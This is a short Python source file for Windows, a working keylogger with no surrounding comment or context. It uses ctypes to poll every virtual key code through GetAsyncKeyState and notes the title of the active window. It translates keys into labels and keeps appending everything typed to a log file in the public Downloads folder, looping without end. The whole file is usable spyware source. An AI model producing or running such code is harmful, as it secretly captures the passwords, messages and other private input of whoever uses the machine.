import ctypes
import time
user32 = ctypes.windll.user32
kernel32 = ctypes.windll.kernel32


DETACHED_PROCESS = 0x00000008
VK_CODES = range(0, 256)

KEY_MAP = {
    0x08: '[BACKSPACE]',
    0x09: '[TAB]',
    0x0D: '[ENTER]',
    0x10: '[SHIFT]',
    0x11: '[CTRL]',
    0x12: '[ALT]',
    0x14: '[CAPSLOCK]',
    0x1B: '[ESC]',
    0x20: ' ',
    0x25: '[LEFT]',
    0x26: '[UP]',
    0x27: '[RIGHT]',
    0x28: '[DOWN]',
    0x2E: '[DEL]',
    0x5B: '[WIN]',
    0x5D: '[WIN_MENU]',
    0xA0: '[LSHIFT]',
    0xA1: '[RSHIFT]',
    0xA2: '[LCTRL]',
    0xA3: '[RCTRL]',
    0xA4: '[LALT]',
    0xA5: '[RALT]',
}

def get_active_window_title():
    hwnd = user32.GetForegroundWindow()
    length = user32.GetWindowTextLengthA(hwnd)
    buffer = ctypes.create_string_buffer(length + 1)
    user32.GetWindowTextA(hwnd, buffer, length + 1)
    return buffer.value.decode('latin1')

def log_keystroke(key):
    with open(r"C:\Users\Public\Downloads\keylog.txt", "a", encoding="utf-8") as f:
        f.write(key)

def start_keylogger():
    last_window = ""
    while True:
        time.sleep(0.01)
        current_window = get_active_window_title()
        if current_window != last_window:
            last_window = current_window
            log_keystroke(f"\n\n[Ventana: {current_window}]\n")

        for key in VK_CODES:
            state = user32.GetAsyncKeyState(key)
            if state & 0x8000: 
                if key in KEY_MAP:
                    log_keystroke(KEY_MAP[key])
                elif 32 <= key <= 126:
                    log_keystroke(chr(key))
                else:
                    log_keystroke(f"[KEY {key}]")

                time.sleep(0.05)

if __name__ == '__main__':
    start_keylogger()
